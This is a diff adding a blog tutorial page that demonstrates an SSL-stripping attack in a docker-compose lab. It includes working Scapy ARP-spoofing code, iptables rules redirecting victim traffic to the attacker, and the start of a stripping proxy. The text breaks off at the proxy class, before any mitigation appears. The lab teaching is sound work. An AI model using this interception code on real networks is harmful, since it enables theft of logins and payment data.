@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">SSL-stripping Demo and Mitigation</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>In this exercise, we demonstrate an ssl-stripping attack. This is
+attack is related to
+<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a>
+and is one of the reasons it is strongly recommended to <em>not</em> serve the same content
+with both HTTP and HTTPS.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#intro" id="markdown-toc-intro">Intro</a></li>
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#arp-spoofing" id="markdown-toc-arp-spoofing">ARP Spoofing</a></li>
+  <li><a href="#ssl-stripping-server" id="markdown-toc-ssl-stripping-server">SSL Stripping Server</a></li>
+  <li><a href="#putting-it-all-together" id="markdown-toc-putting-it-all-together">Putting it All Together</a></li>
+  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="intro">Intro</h2>
+
+<hr />
+
+<p>If this were to happen, the server is supposed to send back a special response
+<code class="language-plaintext highlighter-rouge">[301: Moved Permanently]</code>
+causing most browsers to redirect to the HTTPS
+address automatically. For instance,</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -v http://developer.mozilla.org
+</code></pre></div></div>
+
+<p>Gives the output</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+&lt; HTTP/1.1 301 Moved Permanently
+...
+&lt; Location: https://developer.mozilla.org/
+...
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>Our network setup on docker-compose file</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">legitimate</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+    <span class="na">cap_add</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+    <span class="na">extra_hosts</span><span class="pi">:</span>
+      <span class="c1"># real site omitted. This would be a public site</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">commerce.example.com:&lt;public</span><span class="nv"> </span><span class="s">IP&gt;"</span>
+
+  <span class="na">mallory</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">thierrysans/mallory:ssl-stripping</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
+    <span class="na">cap_add</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+      <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">.:/shared</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">legitimate</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+      <span class="na">malicious</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.1.3</span>
+    <span class="na">extra_hosts</span><span class="pi">:</span>
+      <span class="c1"># real site omitted. This would be a public site</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">commerce.example.com:&lt;public</span><span class="nv"> </span><span class="s">IP&gt;"</span>
+  
+  <span class="na">wireshark</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">thierrysans/wireshark:malicious-gateway</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">wireshark</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:alice</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">legitimate</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+  <span class="na">malicious</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.1.0/24</span>
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/images/ssl-strip.svg" alt="network-diagram" class="svg invert-color" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Network diagram of our system</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Alice’s requests are handled by the following code:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">request</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">commerce.example.com</span><span class="dl">"</span>
+
+<span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="dl">'</span><span class="s1">alice</span><span class="dl">'</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="dl">'</span><span class="s1">4l1c343v3R</span><span class="dl">'</span><span class="p">,</span> <span class="na">cc</span><span class="p">:</span> <span class="dl">'</span><span class="s1">5555555555554444</span><span class="dl">'</span><span class="p">,</span> <span class="na">exp</span><span class="p">:</span> <span class="dl">'</span><span class="s1">07/22</span><span class="dl">'</span><span class="p">,</span> <span class="na">code</span><span class="p">:</span> <span class="dl">'</span><span class="s1">812</span><span class="dl">'</span><span class="p">};</span>
+
+<span class="kd">var</span> <span class="nx">do_request</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">jar</span><span class="p">();</span>
+    <span class="kd">let</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">defaults</span><span class="p">({</span><span class="na">jar</span><span class="p">:</span><span class="nx">j</span><span class="p">});</span>
+    <span class="nx">req</span><span class="p">.</span><span class="kd">get</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/home?lang=en</span><span class="dl">"</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] GET response received</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="na">form</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">password</span><span class="p">},</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+            <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] POST response received</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/buy?item=lamp&amp;currency=CAD</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="na">form</span><span class="p">:</span> <span class="p">{</span><span class="na">cc</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">cc</span><span class="p">,</span> <span class="na">exp</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">exp</span><span class="p">,</span> <span class="na">code</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">code</span><span class="p">},</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">){</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+                <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] PUT response received</span><span class="dl">"</span><span class="p">);</span>
+                <span class="nx">req</span><span class="p">.</span><span class="kd">get</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/check</span><span class="dl">"</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                    <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] GET response received</span><span class="dl">"</span><span class="p">);</span>
+                <span class="p">});</span>
+            <span class="p">});</span>
+        <span class="p">});</span>
+    <span class="p">});</span>
+<span class="p">};</span>
+
+<span class="nx">do_request</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Finally, running
+<code class="language-plaintext highlighter-rouge">$ docker-compose up</code>
+starts the network and containers and we see Alice printing the requests as expected</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[https] GET response received
+[https] POST response received
+[https] PUT response received
+[https] GET response received
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="arp-spoofing">ARP Spoofing</h2>
+
+<hr />
+
+<p>The imports we use for Mallory’s attack script are</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
+<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">server</span> <span class="kn">import</span> <span class="n">run_server</span> <span class="c1"># a custom module used to perform the ssl stripping
+</span></code></pre></div></div>
+
+<p>Since Mallory will be capturing Alice’s traffic, they will first act as a legitimate gateway.
+To accomplish this, we set up iptables routing similar to our <a href="/crypto/2020/10/15/06-malgat.html">Malicious Gateway</a>
+exercise.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -F'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -F -t nat'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -F -t mangle'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Now we need Alice to send the packets to Mallory instead of her current default gateway.
+This can be achieved with ARP spoofing. Conveniently,
+Scapy has <a href="https://scapy.readthedocs.io/en/latest/usage.html#arp-cache-poisoning">a module</a>
+to facilitate this.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ip2mac</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="n">ans</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">'ff:ff:ff:ff:ff:ff'</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ans</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">].</span><span class="n">src</span>
+
+<span class="k">def</span> <span class="nf">restore</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="s">"""
+    Restores the normal process of a regular network
+    This is done by sending the original informations
+    (real IP and MAC of `host_ip` ) to `target_ip`
+    """</span>
+    <span class="c1"># get the real MAC address of target
+</span>    <span class="n">target_mac</span> <span class="o">=</span> <span class="n">ip2mac</span><span class="p">(</span><span class="n">target_ip</span><span class="p">)</span>
+    <span class="c1"># get the real MAC address of spoofed (gateway, i.e router)
+</span>    <span class="n">host_mac</span> <span class="o">=</span> <span class="n">ip2mac</span><span class="p">(</span><span class="n">host_ip</span><span class="p">)</span>
+    <span class="c1"># crafting the restoring packet
+</span>    <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">target_mac</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">hwsrc</span><span class="o">=</span><span class="n">host_mac</span><span class="p">)</span>
+    <span class="c1"># sending the restoring packet
+</span>    <span class="c1"># to restore the network to its normal process
+</span>    <span class="c1"># we send each reply seven times for a good measure (count=7)
+</span>    <span class="n">send</span><span class="p">(</span><span class="n">arp_response</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">arp_spoof</span><span class="p">():</span>
+    <span class="s">'''
+    tell Alice we're the host and vice versa to intercept packets
+    '''</span>
+    <span class="c1"># suppose we know the target ips
+</span>    <span class="n">alice_ip</span> <span class="o">=</span> <span class="s">"10.0.0.2"</span>
+    <span class="n">gate_ip</span> <span class="o">=</span> <span class="s">"10.0.0.1"</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+            <span class="c1"># tell Alice we're the host
+</span>            <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">gate_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">ip2mac</span><span class="p">(</span><span class="n">alice_ip</span><span class="p">),</span> <span class="n">psrc</span><span class="o">=</span><span class="n">alice_ip</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="s">'is-at'</span><span class="p">)</span>
+            <span class="n">send</span><span class="p">(</span><span class="n">arp_response</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+            <span class="c1"># tell the host we're Alice
+</span>            <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">alice_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">ip2mac</span><span class="p">(</span><span class="n">gate_ip</span><span class="p">),</span> <span class="n">psrc</span><span class="o">=</span><span class="n">gate_ip</span><span class="p">,</span> <span class="n">op</span><span class="o">=</span><span class="s">'is-at'</span><span class="p">)</span>
+            <span class="n">send</span><span class="p">(</span><span class="n">arp_response</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Detected CTRL+C ! restoring the network, please wait..."</span><span class="p">)</span>
+        <span class="n">restore</span><span class="p">(</span><span class="n">alice_ip</span><span class="p">,</span> <span class="n">gate_ip</span><span class="p">)</span>
+        <span class="n">restore</span><span class="p">(</span><span class="n">gate_ip</span><span class="p">,</span> <span class="n">alice_ip</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="ssl-stripping-server">SSL Stripping Server</h2>
+
+<hr />
+
+<p>Once the ARP spoofing is set up, Mallory will run the custom ssl stripping server to handle
+requests from Alice’s client.
+The ssl-stripping is implemented in <code class="language-plaintext highlighter-rouge">server.py</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">partial</span>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
+<span class="kn">from</span> <span class="nn">http.client</span> <span class="kn">import</span> <span class="n">HTTPSConnection</span>
+<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">SERVER</span> <span class="o">=</span> <span class="s">"commerce.example.com"</span>
+</code></pre></div></div>
+
+<p>We implement the Server class inheriting from <code class="language-plaintext highlighter-rouge">BaseHTTPRequestHandler</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Server</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+
